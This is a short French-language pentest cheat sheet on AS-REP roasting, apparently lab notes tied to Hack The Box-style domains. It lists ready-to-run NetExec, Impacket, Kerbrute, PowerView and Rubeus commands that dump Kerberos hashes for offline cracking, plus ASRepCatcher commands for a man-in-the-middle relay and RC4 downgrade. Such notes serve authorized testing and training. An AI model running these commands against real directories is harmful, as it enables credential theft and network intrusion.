

# **AS-REP ROASTING**

Récupérer les hash des utilisateurs dont la pre-auth Kerberos est désactivée. Le hash peut ensuite être Brute forcé.

## LINUX
### *NETEXEC*

```bash
netexec ldap 10.10.11.31 -u users -p '' --dns-server 10.10.11.31 --kdcHost dc01.infiltrator.htb --asreproast asrep.txt
```

### *IMPACKET*

```bash
impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
```

### *KERBRUTE*

```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```


## WINDOWS
### PowerView

Identifier les comptes n'ayant pas la préauth kerberos requise

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

### Rubeus

ASREP Roasting sur le compte identifié précédemment

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```


---

# **AS-REP ROASTING MiTM**

> [!TIP]
> Ne requiert pas la désactivation de la pré-auth Kerberos

Intercepter les AS-REPs en Man-In-The-Middle.

### *ASREPCATCHER*

https://github.com/Yaxxine7/ASRepCatcher

#### Relay vers le DC et downgrade en RC4

```bash
ASRepCatcher relay -dc $DC_IP
```

#### Ecoute passive sans altération des paquets

```bash
ASRepCatcher listen
```

